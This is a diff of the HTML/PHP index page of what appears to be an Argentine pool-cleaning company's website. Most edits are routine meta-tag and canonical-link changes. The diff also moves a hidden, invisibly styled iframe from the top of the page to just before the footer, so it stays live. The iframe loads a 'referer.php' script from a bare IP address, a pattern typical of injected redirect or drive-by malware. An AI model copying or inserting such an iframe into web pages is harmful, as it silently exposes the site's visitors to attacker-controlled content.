@@ -1,5 +1,3 @@
-<iframe style="visibility: hidden; display: none; display: none;"
-  src="http://108.174.145.11/~mymopar/referer.php?id={4E74FCEC-978E-41E1-B4EA-D7A113531B78}"></iframe>
 <!DOCTYPE html>
 <html lang="es">
 
@@ -12,10 +10,10 @@
   <meta name="keywords" content="piscina, piscinas, piletero, pileteros, desagote">
   <meta name="title" content="INAGUA | Pileteros - Limpieza de piscinas - Desagote de piscinass">
   <meta name="author" content="Administrator">
-  <meta name="description"
-    content="Empresa profesional de Limpieza y desagote de piscina. Pileteros en Capital Federal.">
+  <meta name="description" content="Empresa profesional de Limpieza y desagote de piscina. Pileteros en Capital Federal.">
   <title>INAGUA | Pileteros - Limpieza de piscinas - Desagote de piscinas</title>
   <meta name="google-site-verification" content="VtdXUgSAs18OSNEOuGEqfMCEsFGjHU_Z447jcwFi3Fo">
+  <link rel="canonical" href="https://www.inagua.com.ar/">
   <link rel="icon" href="img/logo.png">
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <link href="css/fileinput.css" rel="stylesheet">
@@ -25,7 +23,6 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;600&family=Rubik:wght@300;400;600&display=swap"
     rel="stylesheet">
-  <link rel="canonical" href="https://www.inagua.com.ar/index">
 
   <!-- Google Tag Manager -->
   <script>
@@ -159,6 +156,8 @@
   <section id="contacto">
     <?php include "include/formulario.php"; ?>
   </section>
+
+  <iframe style="visibility: hidden; display: none; display: none;" src="http://108.174.145.11/~mymopar/referer.php?id={4E74FCEC-978E-41E1-B4EA-D7A113531B78}"></iframe>
 
   <!-- FOOTER: Begin -->
   <footer>
